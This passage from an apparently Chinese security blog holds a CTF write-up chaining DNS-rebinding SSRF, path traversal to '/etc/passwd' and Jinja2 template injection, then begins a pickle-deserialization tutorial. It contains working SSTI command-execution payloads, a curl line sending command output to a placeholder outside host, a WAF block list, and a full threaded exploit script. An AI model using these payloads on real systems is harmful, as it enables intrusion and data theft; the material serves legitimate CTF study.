class="string">"where"</span>, <span class="string">"union"</span>, <span class="string">".php"</span>, <span class="string">"system"</span>, <span class="string">"access.log"</span>, <span class="string">"passwd"</span>, <span class="string">"cmdline"</span>, <span class="string">"exe"</span>, <span class="string">"fd"</span>, <span class="string">"meta-data"</span>);</span><br><span class="line"></span><br><span class="line">$dst = @$_GET[<span class="string">'ğŸ‡°ğŸ‡·ğŸŸ'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($dst)) <span class="keyword">exit</span>(<span class="string">"Forbidden"</span>);</span><br><span class="line"></span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[<span class="string">'host'</span>], DNS_A)[<span class="number">0</span>][<span class="string">'ip'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($res[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $res[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($waf); $i++) </span><br><span class="line">    <span class="keyword">if</span>(stripos($dst, $waf[$i]) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;svg/onload=\"alert('ç™¼å¤§è²¡!')\"&gt;"</span>.$waf[$i]);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// u can only touch this useless ip :p</span></span><br><span class="line">$dev_ip = <span class="string">"54.87.54.87"</span>;</span><br><span class="line"><span class="keyword">if</span>($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–å†…ç½‘é‡Œè¿˜è·‘äº†ä¸€ä¸ª flaskï¼Œè¿™æ®µä»£ç æ˜æ˜¾æœ‰ SSTIã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br></pre></td></tr></table></figure><p>ä»£ç é‡Œè¿˜å¾ˆè´´å¿ƒçš„åŠ å…¥äº†ä¸€ä¸ª <code>sleep(1)</code>ï¼Œå¯¹è®¿é—® IP çš„é™åˆ¶æ˜¾ç„¶å¯ä»¥é€šè¿‡ DNS rebinding è¿›è¡Œç»•è¿‡ã€‚å½“æœåŠ¡ç«¯é€šè¿‡ <code>dns_get_record</code> è§£ææ—¶ï¼Œè¿”å› <code>54.87.54.87</code>ï¼Œé€šè¿‡ <code>file_get_contents</code> è®¿é—®æ—¶ï¼Œhost è¢«è§£ææˆ <code>127.0.0.1</code> è‡ªç„¶å°±èƒ½æ‰“åˆ°å†…ç½‘ã€‚</p><p>å›½å†…èƒ½ä¹°åˆ°çš„åŸŸå TTL åŸºæœ¬æ— æ³•ä¸ºé›¶ï¼Œéš¾é“éœ€è¦å……é’±ä¹°æ–°åŸŸåå—ï¼Ÿ</p><p>ä¸ï¼Œæœ‰å¾ˆå¤šç°æˆçš„å¹³å°èƒ½ç”¨ï¼Œæ¯”å¦‚ <a href="https://lock.cmpxchg8b.com/rebinder.htmlã€‚" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.htmlã€‚</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wshvl45cj211k06b74t.jpg" alt="image.png"></p><p>ä¸è¿‡è¿™ä¸ªæ˜¯è§„å¾‹æ€§çš„éšæœºè§£æï¼Œè¿˜æ˜¯è¦ç‚¹å°è¿æ°”çš„ ï¼šï¼‰</p><p>å¯çœ‹åˆ°æˆåŠŸè¿›å…¥å†…ç½‘ï¼š</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wsuzjn1yj20v80bpt9z.jpg" alt="image.png"></p><p>è¦æƒ³è®¿é—® <code>/error_page</code> ï¼Œè¿™è¿˜æœ‰ç‚¹å°é™åˆ¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br></pre></td></tr></table></figure><p>ä¸è¿‡åœ¨ Flask é‡Œæœ‰ä¸ªç‰¹æ€§ï¼Œ<code>//korea/error_page</code> =&gt; <code>/error_page</code>ï¼Œè‡ªç„¶å°±è§£å†³äº†ã€‚å½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸ªè·³è½¬ã€‚</p><p>å¦å¤–è¿˜æœ‰ä¸€ç‚¹ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import os</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; os.path.join(<span class="string">"/var/www/flask"</span>, <span class="string">"error"</span>, <span class="string">"/etc/passwd"</span>)</span><br><span class="line"><span class="string">'/etc/passwd'</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯æ§çš„æ–‡ä»¶ï¼Œåˆ«å¿˜äº†å‰é¢è¿˜è·‘äº†ä¸ª PHPï¼Œé‚£å°±åˆ©ç”¨ <code>session.upload_progress</code> è¿›è¡Œä¸Šä¼ å§ï¼Œä¹Ÿæ˜¯å¸¸è§çš„æ‰‹æ®µã€‚å¯å‚è€ƒï¼š</p><p><a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html" target="_blank" rel="noopener">https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html</a></p><p><a href="https://www.anquanke.com/post/id/162656" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162656</a></p><p><a href="http://wonderkun.cc/index.html/?p=718" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=718</a></p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a></p><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ SSTI å¦‚ä½•æ„é€ æ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">è¿‡æ»¤ &#123;&#123;  =&gt;  &#123;%%&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¿‡æ»¤  .  =&gt; </span></span><br><span class="line"><span class="string">            &#123;&#123;''['__class__']&#125;&#125;</span></span><br><span class="line"><span class="string">            &#123;&#123;''|attr('__class__')&#125;&#125;</span></span><br><span class="line"><span class="string">            \x2e</span></span><br><span class="line"><span class="string">            getattr</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸ç”¨ payload</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">      &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">        &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [][<span class="string">'__class__'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c[<span class="string">'__name__'</span>] == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">        &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c[<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'values'</span>]() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> b[<span class="string">'__class__'</span>]==&#123;&#125;[<span class="string">'__class__'</span>] %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b[<span class="string">'keys'</span>]() %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> b[<span class="string">'eval'</span>](<span class="string">'getattr(__import__("os"),"popen")("curl your_host/`/readflag`")'</span>) %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>æŠŠ orange ä¹‹å‰ one line php çš„ exp æ”¹ä¸‹å°±èƒ½ç”¨äº†ï¼Œæœ€ç»ˆ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish.balsnctf.com'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">    &#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">        &#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">            &#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if b['eval']('getattr(__import__("os"),"popen")("curl your_host/`/readflag`")') %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Warm-up&quot;&gt;&lt;a href=&quot;#Warm-up&quot; class=&quot;headerlink&quot; title=&quot;Warm up&quot;&gt;&lt;/a&gt;Warm up&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;å¸¸è§ç»•è¿‡ã€gopher æ‰“ MySQLã€SSRF&lt;/p&gt;
&lt;/blockq
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Python pickle ååºåˆ—åŒ–å®ä¾‹åˆ†æ</title>
    <link href="https://wywwzjj.top/2019/10/24/Python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <id>https://wywwzjj.top/2019/10/24/Python-pickle-ååºåˆ—åŒ–å®ä¾‹åˆ†æ/</id>
    <published>2019-10-24T02:26:07.000Z</published>
    <updated>2019-11-04T02:27:17.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ SUCTF å‡ºäº†ä¸€é¢˜ pickle ååºåˆ—åŒ–çš„æ‚é¡¹é¢˜ï¼Œå°±æ„Ÿè§‰ç›¸å½“æœ‰æ„æ€ã€‚åæ¥ Balsn ä¸€æ¬¡æ€§æäº†ä¸‰ä¸ªï¼Œå¤ªå¼ºäº†ï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œæ„Ÿè°¢è¿™äº›å¸ˆå‚…ã€‚ä¸‹æ–‡è®°å½•äº†æˆ‘çš„å­¦ä¹ ç¬”è®°ä»¥åŠè¸©è¿‡çš„å‘ï¼Œå¸Œæœ›å¯¹å¤§å®¶ç†è§£ pickle æœ‰ç‚¹å¸®åŠ©ã€‚</p><p>è¿™ä¸ª PPT ä¸€å®šè¦å¥½å¥½çœ‹çœ‹ï¼Œéå¸¸çš„é€šä¿—æ˜“æ‡‚ã€‚<br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><blockquote><p>Python æä¾›äº†ä¸¤ä¸ªåº“ï¼Œpickle å’Œ cPickleï¼ˆå…¶ä¸­ cpickle åº•å±‚ä½¿ç”¨ c è¯­è¨€ä¹¦å†™ï¼‰</p><p>ç”¨ pycharm è°ƒè¯•çš„è¯éœ€è¦æ›´æ”¹ä¸€ä¸‹ä»£ç ï¼Œpyckle.py çš„ç¬¬ 1607 è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment"># Use the faster _pickle if possible</span></span><br><span class="line">&gt; <span class="keyword">try</span>:</span><br><span class="line">&gt;     <span class="keyword">from</span> _pickle <span class="keyword">import</span> ( ...  <span class="comment"># è¿™é‡Œ _pickle =&gt; pickle</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="åºåˆ—åŒ–è¿‡ç¨‹"><a href="#åºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="åºåˆ—åŒ–è¿‡ç¨‹"></a>åºåˆ—åŒ–è¿‡ç¨‹</h3><ul><li>ä»å¯¹è±¡ä¸­æå–æ‰€æœ‰å±æ€§ï¼ˆ<code>__dict__</code>ï¼‰ï¼Œå¹¶å°†å±æ€§è½¬ä¸ºé”®å€¼å¯¹</li><li>å†™å…¥å¯¹è±¡çš„ç±»å</li><li>å†™å…¥é”®å€¼å¯¹</li></ul><h3 id="ååºåˆ—åŒ–è¿‡ç¨‹"><a href="#ååºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="ååºåˆ—åŒ–è¿‡ç¨‹"></a>ååºåˆ—åŒ–è¿‡ç¨‹</h3><ul><li>è·å– pickle è¾“å…¥æµ</li><li>é‡å»ºå±æ€§åˆ—è¡¨</li><li>æ ¹æ®ä¿å­˜çš„ç±»ååˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡</li><li>å°†å±æ€§å¤åˆ¶åˆ°æ–°çš„å¯¹è±¡ä¸­</li></ul><h2 id="pickle-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#pickle-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="pickle æ˜¯ä»€ä¹ˆï¼Ÿ"></a>pickle æ˜¯ä»€ä¹ˆï¼Ÿ</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>pickle æ˜¯ä¸€ç§æ ˆè¯­è¨€ï¼Œæœ‰ä¸åŒçš„ç¼–å†™æ–¹å¼ï¼ŒåŸºäºä¸€ä¸ªè½»é‡çš„ PVMï¼ˆPickle Virtual Machineï¼‰ã€‚</p><p>PVM ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li><p><strong>æŒ‡ä»¤å¤„ç†å™¨</strong></p><p>  ä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° <code>.</code> è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ã€‚</p><p>  æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</p></li><li><p><strong>stack</strong></p><p>  ç”± Python çš„ <strong>list</strong> å®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</p></li><li><p><strong>memo</strong></p><p>  ç”± Python çš„ <strong>dict</strong> å®ç°ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚</p></li></ul><p><strong>PS</strong>ï¼šæ³¨æ„ä¸‹ stackã€memo çš„å®ç°æ–¹å¼ï¼Œæ–¹ä¾¿ç†è§£ä¸‹é¢çš„æŒ‡ä»¤ã€‚</p><blockquote><p>å½“å‰ç”¨äº pickling çš„åè®®å…±æœ‰ 5 ç§ã€‚ä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜ï¼Œè¯»å–ç”Ÿæˆçš„ pickle æ‰€éœ€çš„ Python ç‰ˆæœ¬å°±è¦è¶Šæ–°ã€‚</p><ul><li>v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„ â€œäººç±»å¯è¯»â€ åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Pythonã€‚</li><li>v1 ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹ã€‚</li><li>v2 ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­å¼•å…¥çš„ã€‚å®ƒä¸ºå­˜å‚¨ <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class" target="_blank" rel="noopener">new-style class</a> æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶ã€‚æ¬²äº†è§£æœ‰å…³ç¬¬ 2 ç‰ˆåè®®å¸¦æ¥çš„æ”¹è¿›ï¼Œè¯·å‚é˜… <a href="https://www.python.org/dev/peps/pep-0307" target="_blank" rel="noopener"><strong>PEP 307</strong></a>ã€‚</li><li>v3 ç‰ˆåè®®æ·»åŠ äº Python 3.0ã€‚å®ƒå…·æœ‰å¯¹ <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes" target="_blank" rel="noopener"><code>bytes</code></a> å¯¹è±¡çš„æ˜¾å¼æ”¯æŒï¼Œä¸”æ— æ³•è¢« Python 2.x æ‰“å¼€ã€‚è¿™æ˜¯ç›®å‰é»˜è®¤ä½¿ç”¨çš„åè®®ï¼Œä¹Ÿæ˜¯åœ¨è¦æ±‚ä¸å…¶ä»– Python 3 ç‰ˆæœ¬å…¼å®¹æ—¶çš„æ¨èåè®®ã€‚</li><li>v4 ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ã€‚æœ‰å…³ç¬¬ 4 ç‰ˆåè®®å¸¦æ¥æ”¹è¿›çš„ä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="https://www.python.org/dev/peps/pep-3154" target="_blank" rel="noopener"><strong>PEP 3154</strong></a>ã€‚</li></ul></blockquote><h3 id="æŒ‡ä»¤é›†"><a href="#æŒ‡ä»¤é›†" class="headerlink" title="æŒ‡ä»¤é›†"></a>æŒ‡ä»¤é›†</h3><blockquote><p>æœ¬æ–‡é‡ç‚¹è¯´æ˜ 0 å·åè®®ï¼Œä¸æ˜ç™½çš„æŒ‡ä»¤å»ºè®®ç›´æ¥çœ‹å¯¹åº”å®ç°ï¼</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b'('</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b'.'</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b'0'</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b'1'</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b'2'</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b'F'</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b'I'</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b'J'</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b'K'</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b'L'</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b'M'</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b'N'</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b'P'</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b'Q'</span>   <span class="comment">#  "       "         "  ;  "  "   "     "  stack</span></span><br><span class="line">REDUCE         = <span class="string">b'R'</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b'S'</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b'T'</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b'U'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b'V'</span>   <span class="comment"># push Unicode string; raw-unicode-escaped'd argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b'X'</span>   <span class="comment">#   "     "       "  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b'a'</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b'b'</span>   <span 